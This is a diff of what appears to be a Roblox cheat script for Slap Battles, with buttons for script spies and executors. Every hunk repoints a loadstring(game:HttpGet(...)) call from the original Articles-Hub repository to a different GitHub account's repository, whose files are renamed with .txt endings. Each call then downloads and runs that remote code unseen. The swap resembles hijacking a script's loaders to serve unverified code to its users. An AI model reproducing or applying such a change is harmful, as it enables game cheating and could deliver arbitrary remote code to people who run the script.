@@ -2551,7 +2551,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Articles-Hub/ROBLOXSc
 Script2Group:AddButton({
     Text = "Simple Spy",
     Func = function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Articles-Hub/ROBLOXScript/refs/heads/main/SCRIPT/SimpleSpy/SourceBeta.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/granolabarlover06/Slap-battles-/refs/heads/main/SourceBeta.lua.txt"))()
     end
 })
 
@@ -3862,7 +3862,7 @@ repeat task.wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.C
 _G.AutoGetBadgeGlove = "__Glove__"
 task.wait(2)
 pcall(function()
-    Fixed = loadstring(game:HttpGet("https://raw.githubusercontent.com/Articles-Hub/ROBLOXScript/refs/heads/main/SCRIPT/Fix.lua"))()
+    Fixed = loadstring(game:HttpGet("https://raw.githubusercontent.com/granolabarlover06/Slap-battles-/refs/heads/main/Fix.lua.txt"))()
     fireclickdetector = fireclickdetector or Fixed.fireclickdetector
     fireproximityprompt = fireproximityprompt or Fixed.fireproximityprompt
 end)
@@ -4368,7 +4368,7 @@ if game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRoot
 			workspace.Camera.CameraSubject = game:GetService("Players").LocalPlayer.Character
 		end
     else
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Articles-Hub/ROBLOXScript/refs/heads/main/File-Script/Slap_Battles.lua"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/granolabarlover06/Slap-battles-/refs/heads/main/Slap_Battles.txt"))()
     end
 end]]
 
@@ -15796,7 +15796,7 @@ loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield
 end)
 
 Script1Group:AddButton("Executor | Ui Library", function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Articles-Hub/ROBLOXScript/refs/heads/main/SCRIPT/Executor.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/granolabarlover06/Slap-battles-/refs/heads/main/Executor.lua.txt"))()
 end)
 
 Script1Group:AddButton("RemoteSpy", function()
@@ -20205,7 +20205,7 @@ if MobileOn then
 end
 local success, err = pcall(function()
 	getgenv().WindowNah = Window
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Articles-Hub/ROBLOXScript/refs/heads/main/File-Script/CreditJoin.Lua"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/granolabarlover06/Slap-battles-/refs/heads/main/CreditJoin.Lua.txt"))()
 end)
 
 if Window and Tabs then
@@ -20812,7 +20812,7 @@ ExecuteNowTP([[
         game.Loaded:Wait()
     end
     repeat wait() until game.Players.LocalPlayer
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Articles-Hub/ROBLOXScript/refs/heads/main/File-Script/Slap_Battles.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/granolabarlover06/Slap-battles-/refs/heads/main/Slap_Battles.txt"))()
 ]])
 end
 end))
